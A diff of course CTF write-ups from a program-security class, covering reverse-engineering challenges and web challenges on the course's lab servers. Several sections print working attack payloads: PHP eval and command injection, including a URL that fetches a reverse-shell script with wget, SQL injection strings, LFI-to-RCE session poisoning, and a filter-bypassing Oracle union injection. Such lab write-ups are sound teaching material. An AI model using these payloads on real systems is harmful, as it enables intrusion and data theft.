@@ -1,6 +1,7 @@
 # NCTU.108-1.program-security
 
-## [Lab 0x01] What The Hell
+## Lab 0x01
+### What The Hell
 `rev` `50 pts` `FLAG{BABY_REVERSE_123}`
 
 > 跟地獄世界打招呼，摸摸找找 Flag 在哪。
@@ -18,7 +19,8 @@
 2. `$ whatTheHell.exe /get_flag`
 
 
-## [0x01] Back to the Future
+## 0x01
+### Back to the Future
 `rev` `50 pts` `FLAG{PE_!S_EASY}`
 
 > 一九八五年科學家聖豪成功在實驗室研製了軟體時光機，並將開發時光機的「核心機密」埋藏在時光機軟體中。
@@ -34,7 +36,8 @@
 2. 因為 `byte_408008` 跟 `byte_40801c` 都已知，直接 xor 就有 flag。
 
 
-## [0x02] IDAmudamudamuda
+## 0x02
+### IDAmudamudamuda
 `rev` `100 pts` `FLAG{y3s!!y3s!!y3s!!0h_my_g0d!!}`
 
 > ShengHao’s HW1 was too kind, try this.
@@ -48,8 +51,7 @@ There are two important functions related to the input,
 which are `sub_5D1070(v1)` and `sub_5D1270(&v2)`.
 `v1` is the `seed`, and `v2` is the `flag`.
 
-### sub\_5D1070(char a1)
-This function take `seed` as parameter.
+`sub\_5D1070(char a1)` take `seed` as parameter.
 Most of the code are complicated,
 but only a small part of the function is related to the paramter.
 > The whole function first search for `.data` segment, 
@@ -85,8 +87,8 @@ We can find the original data by the debugger.
 \x45\x7b\xdc\x41\xb7\x35\xec\xf0\xf0\xf0\xf0\xdb\xf9\x7b\x35\xec\x73\xb0\xf1\x79\x35\xec\x7b\x3d\xfc\xf3\x3d\xec\xff\xae\x01\x75\xc2\x64\x15\x7b\x35\xf8\xf3\x35\xec\xff\xae\xf8\x73\xb1\x13\x73\xe1\x56\xff\xae\xc1\x7b\x35\xfc\xf3\x35\xec\xff\xae\xf8\x2b\xc1\x64\xf4\x23\xb0\xdb\xf7\xdb\xb5\xa8\xf1\xf0\xf0\xf0\x7b\xd5\x4d\xb3
 ```
 
-### sub\_5D1270(const char \*a1)
-This function will copy some data to `v2` and execute it as a function.
+`sub\_5D1270(const char \*a1)` will copy some data to `v2`
+    and execute it as a function.
 The data is the data mentioned in `sub_5D1070(char a1)`.
 
 ```c
@@ -141,7 +143,8 @@ Thus, the `seed` should be `16`, and we can get the function instructions.
 We know `unk_5D4018`, and we can just reverse the calculation and get the flag.
 
 
-## [Lab 0x03] sushi
+## Lab 0x03
+### sushi
 `web` `50 pts` `FLAG{HaoChihDeSuSiZaiJhengSian}`
 
 > 好ㄘ的蘇洗宰爭先
@@ -168,16 +171,13 @@ eval('die("' . substr($_, 0, 16) . '");');
 
 There is a php magic `$msg = "${@phpinfo()}"`.
 We can requeset `https://edu-ctf.csie.org:10152/?🍣=${@system(ls)}` and get file names.
-
-```
-flag_name_1s_t00_l0ng_QAQQQQQQ index.php phpinfo.php
-```
+> flag_name_1s_t00_l0ng_QAQQQQQQ index.php phpinfo.php
 
 We can not use `${@system(cat flag_name_1s_t00_l0ng_QAQQQQQQ)}` because we can only input string length under 16.
 But we can access the file directly through `https://edu-ctf.csie.org:10152/flag_name_1s_t00_l0ng_QAQQQQQQ` and get the flag.
 
 
-## [Lab 0x03] me0w
+### me0w
 `web` `50 pts` `FLAG{me0w!m3ow!meow!}`
 
 > 喵🐱🐈
@@ -210,7 +210,7 @@ https://edu-ctf.csie.org:10153/?me0w=index.php%0awget%20<ip>:<port1>/revshell.sh
 ```
 
 
-## [Lab 0x03] No Password
+### No Password
 `web` `50 pts` `FLAG{baby_first_sqlinj}`
 
 > Login as admin!
@@ -221,7 +221,8 @@ It's a simple SQLi, and the payload is shown on the page.
 Both username and password input `a" or "a"="a`.
 
 
-## [0x03] Unexploitable
+## 0x03
+### Unexploitable
 `web` `100 pts` `FLAG{baby_recon_dont_forget_to_look_github_page}`
 
 > Exploit the unexploitable!
@@ -255,7 +256,7 @@ Try to find it in the commits,
 The flag is in the file.
 
 
-## [0x03] Safe R/W
+### Safe R/W
 `web` `200 pts` `FLAG{w3lc0me_t0_th3_PHP_W0r1d}`
 
 > I implemented the safest php file reader/writer!
@@ -275,7 +276,8 @@ $ ./race.py | $ ./race.py '<?php system("cat /flag_is_here")'
 ```
 
 
-## [Lab 0x04] sh3ll_upload3r
+## Lab 0x04
+### sh3ll\_upload3r
 `web` `50 pts` `FLAG{simple_upload_practice_lol}`
 
 > file upload is so dangerous!
@@ -291,7 +293,7 @@ If we upload `file.php.jpg`,
 After upload the file, access the uploaded file with `https://edu-ctf.csie.org:10156/upload/<filename>`
 
 
-## [Lab 0x04] EzLFI
+### EzLFI
 `web` `50 pts` `FLAG{lfi_session_is_so_coool}`
 
 There are two functions in the php code, which are `register` and `module`.
@@ -313,7 +315,7 @@ https://edu-ctf.csie.org:10157/?action=module&m=../../../../var/lib/php/session/
 We change `<?php phpinfo(); ?>` to `<?php system("<cmd>"); ?>` and get the flag.
 
 
-## [Lab 0x04] EasyPeasy
+### EasyPeasy
 `web` `50 pts` `FLAG{union_based_sqlinj_is_sooooooooo_easy}`
 
 > Try your first Union-based SQL Injection!
@@ -350,4 +352,87 @@ https://edu-ctf.csie.org:10158/news.php?id=-1%20union%20select%201,2,THIS_IS_FLA
 /* FLAG{union_based_sqlinj_is_sooooooooo_easy} */
 ```
 
+## 0x04
+### Cathub v2
+`web` `150` `FLAG{hey___or@cle_d4tab4s3__inj3cti0n_i5____to0OoO0ooO0OO_e4sy!!!!!??}`
 
+> jin-duen-jiang is too easy, let's play cathub!
+> 
+> [Link](https://edu-ctf.csie.org:10159/)
+
+There are two suspicious entrypoints,
+    which are `index.php?search=` and `video.php?vid=`.
+Try `video.php?vid=2-1` and get the same page of `video.php?vid=1`.
+
+Then we try to get column number by using `video.php?vid=1 order by 1`
+    and get blocked.
+After some trial and find out that `space` is blocked.
+We try to use `/**/` to bypass and finally know the column number is 3.
+
+```
+https://edu-ctf.csie.org:10159/video.php?vid=1/**/order/**/by/**/3
+```
+
+We try to use `union select 1,2,3` and get an error.
+The database may not MySQL.
+Then we try `union select NULL,NULL,NULL from dual` and succeed.
+
+```
+https://edu-ctf.csie.org:10159/video.php?vid=1/**/union/**/select/**/NULL,NULL,NULL/**/from/**/dual
+```
+
+Because the database is `oracle`, the column type must be correct.
+We try `union select 1,USER,null`,
+    and know we should put the expect result in the seconde column.
+
+```
+https://edu-ctf.csie.org:10159/video.php?vid=1/**/union/**/select/**/1,USER,NULL/**/from/**/dual
+```
+
+We try to get owners of tables, but we failed to use `rownum`.
+> The reason is that `rownum` need to be used with subqueries.
+
+```
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/distinct/**/1,owner,NULL/**/from/**/all_tables
+```
+
+So we try to concat `rows` like `GROUP_CONCAT` in `MySQL`,
+    and use `user_tables` instead of `all_tables`
+
+```
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,LISTAGG(table_name,NULL)/**/WITHIN/**/GROUP/**/(ORDER/**/BY/**/table_name),NULL/**/from/**/user_tables
+---
+BONUSCAT_VIDEOSDEPTEMPS3CRETSALGRADE
+```
+
+Because we can not split the table name,
+    we add some character between them with `to_char`.
+> `CHR()` and `quote` are blocked.
+
+```
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,LISTAGG(table_name,to_char(121))/**/WITHIN/**/GROUP/**/(ORDER/**/BY/**/table_name),NULL/**/from/**/user_tables
+---
+BONUS121CAT_VIDEOS121DEPT121EMP121S3CRET121SALGRADE
+```
+
+Use the same way to get column names.
+
+```
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,LISTAGG(column_name,to_char(121))/**/WITHIN/**/GROUP/**/(ORDER/**/BY/**/table_name),NULL/**/from/**/USER_TAB_COLUMNS
+---
+COMM121ENAME121JOB121SAL121ID121NAME121URL121DEPTNO121DNAME121LOC121COMM121DEPTNO121EMPNO121ENAME121HIREDATE121JOB121MGR121SAL121ID121V3RY_S3CRET_C0LUMN121GRADE121HISAL121LOSAL
+```
+
+Use table name `s3cret` and column name `v3ry_s3cret_c0lumn`
+
+```
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,v3ry_s3cret_c0lumn,NULL/**/from/**/s3cret
+---
+FLAG{HEY___OR@CLE_D4TAB4S3__INJ3CTI0N_I5____TO0OOO0OOO0OO_E4SY!!!!!??}
+```
+
+The flag is render by CSS, the true flag is
+
+```
+FLAG{hey___or@cle_d4tab4s3__inj3cti0n_i5____to0OoO0ooO0OO_e4sy!!!!!??}
+```
